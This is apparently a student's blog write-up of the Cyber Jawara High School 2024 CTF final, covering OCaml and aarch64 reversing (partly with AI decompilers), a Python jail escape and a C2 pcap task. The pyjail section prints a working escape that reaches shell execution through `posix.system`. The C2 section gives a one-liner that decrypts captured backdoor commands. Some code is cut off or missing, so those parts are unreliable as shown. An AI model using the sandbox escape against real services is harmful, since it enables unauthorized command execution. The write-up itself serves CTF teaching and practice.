## Cyber Jawara High School 2024 Final

Cyber Jawara is a national CTF held by CSIRT.id and Indonesia Network Security Association.
It's quite a well-known competition,
as it has ran for more than a decade now,
and there's a competition division for high school students!

All solve is by me :p  
We were so close to getting to top 3, but...
Well, maybe next time,
though genggx. managed to upsolve a pwn chall minutes after it ends ;;

Also, this might be the first write-up only available on my blog!! (i.e. no gdocs ver.)  
**You can get the challenges files on my CTF repo!**  
Anyway, happy reading!! :DD

## REVERSE ENGINEERING

### [140] Camel White [12 Solves]

#### Summary

OCaml fibonacci optimization!

#### Solution

We're only given one file, `main.ml`:

{{< highlight ocaml >}}
let rec f n = if n <= 1 then n else f (n - 1) + f (n - 2)
let x n = (f n) lxor (n * n)

let () =
  Printf.printf "CJ{";
  let data = [13; 37; 69; 420; 666; 1337] in
  (* let data = [13] in *)
  let rec display item = match item with
    | [] -> Printf.printf "}\n"
    | hd :: tl -> Printf.printf "%x" (x hd); display tl
  in
    display data
{{< /highlight >}}

So, let $f_{n}$ be the $(n + 4)^{th}$ fibonacci number.
This means, $f_{2}$ is $5$,
because the fibonacci sequence starts with $0, 1, 1, 2, 3, 5$,
and the sixth one is $5$!!  
A bit weird, but that's just how it's here.  


What it does is simply print the hexadecimal value for each $n$ defined as `data` there,
and encapsulate them with `CJ{}`, the flag format.

Now, why don't we just run it?  
Because this is unoptimized!  
It'll take a *really* long time for the program to calculate the fibonacci numbers.

The solution here is to simply optimize the fibonacci function, `f`:

{{< highlight ocaml >}}
let fib n =
  let rec aux a b i =
    if i = n then a
    else aux b (a + b) (i + 1)
  in aux 0 1 0
{{< /highlight >}}

Yup!! That's all it takes.
I had to download `ocaml` to run this,
but other than that, just run the optimized code!!

**Flag: `CJ{401709b206b04f4c2ecdb29ab0c75b437d2a04e5fe72d81a0fdc45bca02e710d983c}`**  
**Rating: [4/10]**

I tried making the solver in python,
but because it has no limit on the size of integer,
the resulting flag is wayy wayy longerr,
so it's wrong!  
I don't understand the syntax,
but as always,
the Transformer NN is there to help :>

### [500] 🩸 Gudang Garam 🩸 [1 Solve]

#### Summary

aarch64 asm to C, as always, then rev it, EZZ...

#### Solution

So, the given asm file is quite big,

Most of it are just data though.

Doing this manually would be tiring, isn't it?  
Just give an 'expert system' the `main` and `check` function!  

Gemini turned it to C:

{{< highlight c >}}
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

// Assuming _strlen is available (likely from the standard library)
size_t strlen(const char *s);

// Placeholder for the data at the addresses referenced in the assembly
// You'll need to define these based on your specific application.
// For example, if _X is an array of ints, you'd declare it like this:
// int32_t _X[...];
// The size of the array depends on the context of the assembly.
// The assembly code accesses _X and _X+0x1000, so it's likely an array
// with at least 0x1000/4 = 1024 elements (assuming 32-bit ints).

// Example (adjust as needed):
int32_t _X[2048]; // Example size, adjust as needed

    }

    return return_code;
}
{{< /highlight >}}

You can clearly see `main` just checks for input length,
then passing the first argument `argv[1]` to `check`.
Our input is using program argument, 
as in `./garam CJ{flek}`.
It has to be 44 (0x2c) chars.

Also, that's quite a low level definition of `check`.
It checks input length again (useless),
then iterate 44 times to calculate $\Sigma_{0}^{43} f_{i} \times X_{i}$,
but it's unclear how it access `X`.

If you notice something on Gemini's output,
it multiplies index `local_8` (outer loop) with `0xB0` (176).
Since the size of each element is 4 bytes (see asm code),
then $\frac{176}{4} = 44$.  
Ahh!!  
So, `X` is an 2D array of $44 \times 44$ size!

Let's see what the other say about this.
Claude give us this for `check`:

{{< highlight c >}}
int check(char* input) {
    int sum = 0;
    
    for (int i = 0; i < 44; i++) {
        sum = 0;
        for (int j = 0; j < 44; j++) {
            extern int X[44][44];
            sum += X[i][j] * input[j];
        }
        
        extern int Y[44];
        if (sum != Y[i]) {
            return 0;
        }
    }
    
    return 1;
}
{{< /highlight >}}

It successfully identifies `X` as a 2D array.
Immediately, I realize what Y actually for here.
I can express it like: 
$$\left( Y_{i} = \Sigma_{j = 0}^{43} f_{j} \times X_{i,j} \right) \forall i \in \\{0,1,...,43\\}$$
I know you get what that means ;)  
Like, do I need to explain it?
The code should be enough.

Now, just turn the asm `X` to a 2D python array,
and also `Y`,
then with known values `CJ{}`,
we use Z3 to solve it!  
It's simple really, here's the solver:

### [410] Baby Pyjail [4 Solves]

#### Summary

A standard no builtins pyjail, without length limit.

#### Solution

So, we're given these files: `Dockerfile`, which contains [instructions](https://www.google.com/search?q=dockerfile+is&sourceid=chrome&ie=UTF-8#:~:text=Dockerfile%20reference,%E2%80%BA%20reference%20%E2%80%BA%20dockerfile) for building an Docker image;  
`docker-compose.yml`, which 'define and share multi-container applications';  
'flag.txt', our read target, locally contains `REDACTED`; and  
`jail.py`, the Python code for the jail itself.

Let's see the docker files first!

{{< highlight docker >}}
# Dockerfile
FROM python:3.10-alpine AS app

FROM pwn.red/jail
COPY --from=app / /srv
COPY jail.py /srv/app/run
RUN chmod +x /srv/app/run
COPY flag.txt /srv/flag.txt

RUN chmod 444 /srv/flag.txt && mv /srv/flag.txt /srv/flag-$(head -c8 /dev/urandom | md5sum | tr -cd '[:alnum:]')
ENV JAIL_MEM=20M
{{< /highlight >}}

This setup the docker image.
You can see at line 10, it rename the file with a random md5sum.
So, this means that we need to at least `ls` the file system to know the actual name in the remote instance.

{{< highlight yaml >}}
version: '3'

services:
  baby-pyjail:
    build: .
    restart: on-failure
    privileged: true
    ports:
      - 7041:5000
{{< /highlight >}}

So, I guess we're privileged, hehe.
You can't delete the flag file though,
since it was set to read-only for all users (including root).

Aight, now how about the jail itself?

{{< highlight py >}}
#!/usr/local/bin/python3 -S

def run_code(code):
    # print(code)
    # e(code, {'__builtins__': None, 'i': i})
    e(code, {'__builtins__': None})

i, e = input, exec
user_input = i('>>> ')

try:
    run_code(user_input)
    # print('ran')
except:
    # print('except')
    pass
{{< /highlight >}}

Really short, it just sets `__builtins__` to `None`,
effectively deleting it.
built-in functions like `open` or `import` is gone.
But, we can recover builtins,
as object types still exists,
like `()`, a tuple,
or '""', a str.

I debug this locally by building the docker,
and modifying `jail.py` to print the result of the payload,
either exception or ran.
I also add `i` to the `e` globals argument,
so I can call it to see what an expression returns.
You can see these with the commented codes above.

I started with getting the `object` class,

```gdscript3
>>> i(().__class__)
i(().__class__)
<class 'tuple'>
ran
>>> i(().__class__.__mro__)                  
i(().__class__.__mro__)
(<class 'tuple'>, <class 'object'>)
ran
```

Got it!
Now, we're using object introspection.
This can be done by calling `__subclasses__()`
to list all loaded classes in memory.
We're looking for `os`, `subprocess`, or `open`.

```gdscript3
>>> i(().__class__.__mro__[1].__subclasses__)
i(().__class__.__mro__[1].__subclasses__)
<built-in method __subclasses__ of type object at 0xffffb2fa8698>
ran
>>> i(().__class__.__mro__[1].__subclasses__())
i(().__class__.__mro__[1].__subclasses__())

ran
```

Whww, that's a really long one :v  
There's none of the classes specified earlier,
but there's `_io` and `_frozen_importlib`.

I first tried `_io` and its modules,
but none seems to work,
and that also the flag name is unknown.

So I went with `_frozen_importlib` instead,
and Arcanum said these functions are interesting:

1. **`_frozen_importlib.BuiltinImporter`**
2. **`_frozen_importlib.FrozenImporter`**
3. **`_frozen_importlib_external.FileLoader`**
4. **`_frozen_importlib_external.FileFinder`**

If I tried `FrozenImporter`,
it doesn't seems to have any useful modules...

```gdscript3
>>> i(().__class__.__bases__[0].__subclasses__()[104].exec_module("sys"))
i(().__class__.__bases__[0].__subclasses__()[104].exec_module("sys"))
None
ran
>>> i(().__class__.__bases__[0].__subclasses__()[104].exec_module("os"))
i(().__class__.__bases__[0].__subclasses__()[104].exec_module("os"))
None
ran
>>> i(().__class__.__bases__[0].__subclasses__()[104].exec_module("subprocess"))
i(().__class__.__bases__[0].__subclasses__()[104].exec_module("subprocess"))
None
ran
```

What works was `BuiltinImporter`,
which has the `sys` module!! :o

```gdscript3
>>> i(().__class__.__mro__[1].__subclasses__()[104])
i(().__class__.__mro__[1].__subclasses__()[104])
<class '_frozen_importlib.BuiltinImporter'>
ran
>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("os"))
i(().__class__.__mro__[1].__subclasses__()[104].load_module("os"))
except
>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys"))
i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys"))
<module 'sys' (<class '_frozen_importlib.BuiltinImporter'>)>
ran
>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules)
i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules)

ran
```

There's even `builtins` there!!  
But here,
I just use `posix` that allow me to execute shell commands
with its `system` method.

```
>>> i(().__class__.__mro__[1].__subclasses__()[104].load_module("sys").modules['posix'].system('id'))

That's the local flag :>  
Now, just do it on the remote instance!

### [500] ⌛️ C2 ⌛️ [0 Solve]

#### Summary

Upsolved! Given a .pcap, we extract a C2 backdoor binary, and with incoming openssl AES-128 ECB encrypted commands, get the flag as one of the decrypted command.

#### Solution

WIP

By the way, one guy just solve the chall with one command 🥶🥶

```sh
$ tshark -r c2.pcap -Y 'tcp.port eq 22222 and data.len > 8' -Tfields -e data | xargs -IZ bash -c 'echo $(echo Z | xxd -r -p | openssl enc -aes-128-ecb -d -K A7D35E2FB881F6C490DE6AC93B7E8FE2)'
